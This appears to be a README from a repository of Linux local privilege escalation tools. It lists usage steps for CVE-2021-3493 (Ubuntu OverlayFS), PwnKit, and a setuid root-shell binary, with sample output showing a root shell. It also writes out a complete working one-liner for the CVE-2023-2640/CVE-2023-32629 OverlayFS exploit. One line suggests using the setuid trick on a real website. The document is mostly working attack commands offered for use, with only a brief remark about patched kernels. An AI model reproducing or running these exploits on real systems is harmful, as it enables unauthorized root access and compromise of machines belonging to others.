# Root Kernel tools

# CVE-2021-3493
Ubuntu OverlayFS Local Privesc
Affected Versions

    Ubuntu 20.10
    Ubuntu 20.04 LTS
    Ubuntu 19.04
    Ubuntu 18.04 LTS
    Ubuntu 16.04 LTS
    Ubuntu 14.04 ESM
[Refference](https://github.com/briskets/CVE-2021-3493/tree/main)
# Usage 
- `gcc exploit.c -o exploit `
- `./exploit`

  # Exploit 2 ( Pwnkit )

- `chmod +x pwnkit`
- `./pwnkit`


# Exploit 3

## Affected systems
To remediate the vulnerability, ensure your Linux systems are running a patched kernel version.

Major Linux distributions have released dedicated security bulletins to help mitigate the vulnerability, including:

- Ubuntu
- Debian
- Amazon Linux
- Red Hat

  Firstly you need change it file user to root , for the real website u can use it if admin always change to root

- `gcc -Wall setuid.c -o setuid`
- `chmod +s setuid`

```
john@machine:~$ ./setuid
Starting root shell...
root@machine:~$ id
uid=0(root) gid=0(root) groups=0(root),1002(john)
```

# Exploit 4

### CVE-2023-2640-CVE-2023-32629

- `chmod +x exploit.sh`
- `./exploit.sh`

  or

`unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'`

[Refference](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629/blob/main/exploit.sh)
